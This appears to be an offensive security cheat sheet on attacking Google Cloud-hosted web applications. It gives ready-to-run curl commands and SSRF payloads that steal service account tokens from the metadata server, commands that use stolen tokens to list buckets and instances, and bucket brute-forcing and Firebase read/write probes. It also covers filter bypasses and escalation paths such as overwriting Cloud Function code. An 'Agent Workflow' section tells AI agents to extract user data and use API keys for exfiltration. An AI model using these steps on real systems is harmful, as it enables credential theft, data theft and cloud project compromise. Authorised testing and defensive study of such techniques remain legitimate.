# Google Cloud Platform (GCP) Web Attacks

> **Summary**: Exploitation of GCP-specific services and misconfigurations reachable through web application vulnerabilities.
> **Impact**: Service account token theft, data exfiltration from GCS buckets and Firestore, project compromise via SSRF to metadata.
> **Typical Severity**: High | Critical

## Detection
### Indicators
- Application making calls to `metadata.google.internal` or `169.254.169.254`
- GCP-specific domains in source: `*.storage.googleapis.com`, `*.appspot.com`, `*.cloudfunctions.net`, `*.run.app`
- Firebase configuration objects in client-side JavaScript (apiKey, authDomain, projectId)
- Google API keys exposed in source code or network requests

### Automated Detection
```bash
# Enumerate GCP resources
cloud_enum -k <COMPANY_NAME> -l gcp_results.txt

# Check for exposed GCS buckets
curl -s "https://storage.googleapis.com/<BUCKET_NAME>"

# Brute-force GCP bucket permissions
python3 GCPBucketBrute.py -k <KEYWORD> -o results.txt
```

### Manual Detection
1. Inspect JavaScript source for Firebase config objects (`apiKey`, `authDomain`, `databaseURL`, `projectId`)
2. Check if the site uses `*.appspot.com` -- the GCS bucket may be at `https://storage.googleapis.com/<SITE_URL>`
3. Look for Google API keys in JS files (pattern: `AIza[0-9A-Za-z-_]{35}`)
4. Test for exposed Firebase databases by appending `.json` to `firebaseio.com` URLs

## Exploitation
### Prerequisites
- Web application hosted on GCP (Compute Engine, Cloud Run, Cloud Functions, App Engine, GKE)
- SSRF vulnerability or exposed GCP configuration
- For Firebase attacks: exposed Firebase configuration or unrestricted database rules

### Step-by-Step

#### 1. SSRF to GCP Metadata Service

GCP metadata requires the `Metadata-Flavor: Google` header:

```bash
# 1. Get service account access token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Success: returns {"access_token":"ya29.xxx","expires_in":3600,"token_type":"Bearer"}

# 2. Get service account email
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# 3. Get project ID
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"

# 4. Get instance metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/hostname"

# 5. Get custom metadata and startup scripts (may contain secrets)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true"

# 6. Get Kubernetes cluster credentials (if GKE)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env"
```

> GCP metadata requires `Metadata-Flavor: Google` header. Requests without it or with `X-Forwarded-For` header are rejected. Exploit via header injection in SSRF.

#### 2. Using Stolen Service Account Tokens

```bash
TOKEN="<STOLEN_ACCESS_TOKEN>"

# List GCS buckets
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=<PROJECT_ID>"

# List objects in a bucket
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/<BUCKET>/o"

# List Compute Engine instances
curl -H "Authorization: Bearer $TOKEN" \
  "https://compute.googleapis.com/compute/v1/projects/<PROJECT_ID>/zones/<ZONE>/instances"

# List Cloud Functions
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudfunctions.googleapis.com/v1/projects/<PROJECT_ID>/locations/-/functions"

# gcloud CLI alternative
gcloud auth activate-service-account --key-file=<KEY_FILE>
# Or with access token:
gcloud auth print-access-token  # verify
```

#### 3. GCS Bucket Misconfiguration

```bash
# Check for public listing
curl "https://storage.googleapis.com/storage/v1/b/<BUCKET_NAME>/o"
curl "https://storage.googleapis.com/<BUCKET_NAME>"

# Check for unauthenticated read
curl "https://storage.googleapis.com/<BUCKET_NAME>/<OBJECT_NAME>"

# Check for unauthenticated write
curl -X POST "https://storage.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=test.txt" \
  -H "Content-Type: text/plain" -d "test"

# Brute-force bucket permissions
python3 GCPBucketBrute.py -k <COMPANY_KEYWORD>
```

#### 4. Google Identity Platform Exploitation

Applications using Google Identity may expose admin-only endpoints:

```
# Check project configuration (may leak info)
GET /v1/projects?key=<GOOGLE_API_KEY>
Host: identitytoolkit.googleapis.com

# Attempt to sign up new users if registration is open
POST /identitytoolkit/v3/relyingparty/signupNewUser?key=<GOOGLE_API_KEY>
Host: www.googleapis.com
Content-Type: application/json

{"returnSecureToken":true,"email":"<EMAIL>","password":"<PASSWORD>"}

# Check for deleteAccount, signUp, and other sensitive endpoints
# Documentation: https://developers.google.com/resources/api-libraries/documentation/identitytoolkit/v3/python/latest/
```

#### 5. Firebase Database Exploitation

```bash
# Check for unauthenticated database read
curl "https://<PROJECT_ID>.firebaseio.com/.json"
# If returns data instead of "Permission Denied", the database is open

# Read specific paths
curl "https://<PROJECT_ID>.firebaseio.com/users.json"

# Write to database (if rules allow)
curl -X PUT "https://<PROJECT_ID>.firebaseio.com/test.json" \
  -d '{"exploit": "test"}'

# Use Pyrebase for more complex interactions
# pip install pyrebase
```

### Payloads

#### SSRF Metadata Payloads
```
# Standard metadata endpoint
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Alternative hostnames
http://metadata/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Recursive listing (get everything)
http://metadata.google.internal/computeMetadata/v1/?recursive=true

# Kubernetes-specific (GKE)
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env

# Cloud Function specific
http://metadata.google.internal/computeMetadata/v1/project/attributes/
```

### Proof of Concept

SSRF to service account token theft:
1. Find SSRF in `https://<TARGET>/api/fetch?url=`
2. Craft request with `Metadata-Flavor: Google` header (requires header injection)
3. Request `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
4. Extract `access_token` from JSON response
5. Use token: `curl -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=<PROJECT_ID>"`

## Bypasses
- **Header injection for Metadata-Flavor**: CRLF injection to add `Metadata-Flavor: Google`
- **DNS rebinding**: Resolve attacker domain to `169.254.169.254` after initial check
- **Alternative hostnames**: Try `metadata` instead of `metadata.google.internal`
- **URL encoding**: Encode `metadata.google.internal` to bypass blocklists
- **Redirect-based**: GCP metadata rejects requests with `X-Forwarded-For`, but some redirect chains strip it

## Escalation
- From service account token: enumerate IAM policies, attempt to create new service account keys
- From GCS write access: overwrite application code, modify Cloud Function source, inject into CI/CD artifacts
- From Firebase admin: read/write all user data, modify authentication rules
- From Kubernetes credentials: access cluster resources, pivot to other pods
- From API keys: test key against all Google APIs for overly permissive scopes

## Tools
| Tool | Usage |
|------|-------|
| [cloud_enum](https://github.com/initstring/cloud_enum) | `cloud_enum -k <COMPANY>` -- Multi-cloud resource enumeration |
| [GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute) | Brute-force GCS bucket names and permissions |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | Multi-cloud security auditing tool |
| [Pyrebase](https://github.com/thisbejim/Pyrebase) | Python interface to Firebase REST API |
| [gcloud](https://cloud.google.com/sdk/gcloud) | `gcloud auth activate-service-account` -- Official GCP CLI |
| [gcpwn](https://github.com/NetSPI/gcpwn) | GCP exploitation framework |
| [hayat](https://github.com/DenizParlak/hayat) | Google Cloud Platform enumeration and assessment |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for GCP-specific web vulnerabilities.

### Phase 1: Detection
1. Check for GCP indicators in the target application:
   - Domains: `*.storage.googleapis.com`, `*.appspot.com`, `*.cloudfunctions.net`, `*.run.app`
   - JavaScript: Firebase config objects (`apiKey`, `authDomain`, `projectId`, `databaseURL`)
   - Google API keys in source code (pattern: `AIza[0-9A-Za-z-_]{35}`)
2. Test for exposed Firebase databases:
   ```
   curl "https://<PROJECT_ID>.firebaseio.com/.json"
   ```
3. Check for exposed GCS buckets:
   ```
   curl "https://storage.googleapis.com/<BUCKET_NAME>"
   ```
4. Test for SSRF endpoints that could reach `metadata.google.internal`

### Phase 2: Exploitation
1. **SSRF to GCP metadata** (requires `Metadata-Flavor: Google` header):
   ```
   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
   ```
2. **Firebase database exploitation** (if open):
   ```
   curl "https://<PROJECT_ID>.firebaseio.com/.json"
   curl "https://<PROJECT_ID>.firebaseio.com/users.json"
   ```
3. **GCS bucket testing**:
   ```
   curl "https://storage.googleapis.com/storage/v1/b/<BUCKET>/o"
   python3 GCPBucketBrute.py -k <COMPANY_KEYWORD>
   ```
4. **Google API key testing**: test discovered API keys against various Google APIs to determine scope
5. **Using stolen service account tokens**:
   ```
   curl -H "Authorization: Bearer <TOKEN>" "https://storage.googleapis.com/storage/v1/b?project=<PROJECT_ID>"
   ```

### Phase 3: Analysis
1. If service account token obtained:
   - List GCS buckets and objects
   - List Compute Engine instances
   - List Cloud Functions
   - Check for privilege escalation via IAM policy manipulation
2. If Firebase database is open:
   - Enumerate all data paths for sensitive information
   - Check for write access (attempt PUT to test path)
3. If GCS buckets are accessible:
   - Search for configuration files, secrets, and backups
   - Check for write access to overwrite application code
4. Test Google API keys for overly permissive scopes

### Phase 4: Next Steps
- If service account token: enumerate all GCP services, attempt privilege escalation
- If Firebase open: extract user data, test for write access
- If GCS write access: overwrite Cloud Function source code or CI/CD artifacts
- If API keys have broad scope: use for data exfiltration or service abuse
- Cross-reference with [SSRF](../vulns/ssrf.md) for metadata access bypass techniques

## Decision Tree

```
START: GCP hosting confirmed (domains, Firebase config, API keys)
  |
  +--> SSRF vulnerability present?
  |      |
  |      +--> Header injection possible? --> Add Metadata-Flavor: Google --> Steal service account token
  |      +--> No header control? --> Try alternative hostnames (metadata, 169.254.169.254)
  |
  +--> Firebase database found?
  |      |
  |      +--> Open read access? --> Enumerate all data paths
  |      +--> Open write access? --> Document and report
  |
  +--> GCS buckets discovered?
  |      |
  |      +--> Public listing? --> Enumerate and download
  |      +--> Public write? --> Test code overwrite
  |
  +--> Google API keys found?
  |      |
  |      +--> Test against Google APIs --> Determine scope and permissions
  |
  +--> Token obtained? --> Enumerate GCP resources --> Escalate
```

## Success Criteria

- [ ] GCP hosting indicators identified (domains, Firebase config, API keys)
- [ ] SSRF tested against GCP metadata service with Metadata-Flavor header
- [ ] Firebase databases tested for unauthenticated read/write
- [ ] GCS buckets tested for public access (list, read, write)
- [ ] Google API keys tested for scope and permissions
- [ ] Stolen tokens used to enumerate accessible GCP resources
- [ ] Attack chain documented from initial access to impact

## References
- [Exploiting Weak Configurations in Google Identity Platform](https://blog.appsecco.com/exploiting-weak-configurations-in-google-identity-platform-cbddbd0e71e3)
- [Hunting GCP Buckets](https://hackingthe.cloud/gcp/general-knowledge/gcp-buckets/)
- [GCP Metadata API Documentation](https://cloud.google.com/compute/docs/metadata/querying-metadata)
- [Hacking the Cloud -- GCP](https://hackingthe.cloud/gcp/general-knowledge/intro_metadata_service/)
- [Firebase Security Rules](https://firebase.google.com/docs/rules)

**See also**: [SSRF](../vulns/ssrf.md)
